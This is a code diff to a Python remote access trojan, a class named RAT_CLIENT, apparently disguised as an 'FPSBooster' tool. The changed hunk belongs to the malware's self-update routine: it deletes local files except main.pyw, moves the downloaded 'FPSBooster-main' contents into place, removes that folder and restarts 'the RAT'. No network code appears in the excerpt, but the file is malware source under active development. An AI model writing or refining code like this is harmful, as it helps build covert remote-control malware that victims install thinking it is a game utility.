@@ -20,6 +20,8 @@ import getpass
 import winreg as _winreg
 import shutil
 
+# This should be replaced
+
 script_dir = os.path.dirname(os.path.abspath(__file__))
 
 # Append the script directory to sys.path to make the imports work from anywhere
@@ -355,16 +357,13 @@ class RAT_CLIENT:
                 if filename != "main.pyw":
                     os.remove(filename)
 
-            # Rename the extracted directory to the desired name
+            # Make all the files inside the FPSBooster-main directory the current directory
             extracted_dir = "FPSBooster-main"
-            for item in os.listdir(extracted_dir):
-                src = os.path.join(extracted_dir, item)
-                dst = os.path.join(".", item)
-                if os.path.isdir(src):
-                    shutil.copytree(src, dst)
-                else:
-                    shutil.copy2(src, dst)
-            shutil.rmtree(extracted_dir)
+            for filename in os.listdir(extracted_dir):
+                shutil.move(os.path.join(extracted_dir, filename), ".")
+
+            # Delete the FPSBooster-main directory
+            os.rmdir(extracted_dir)
 
             # Restart the RAT
             subprocess.Popen(["python", "main.pyw"])
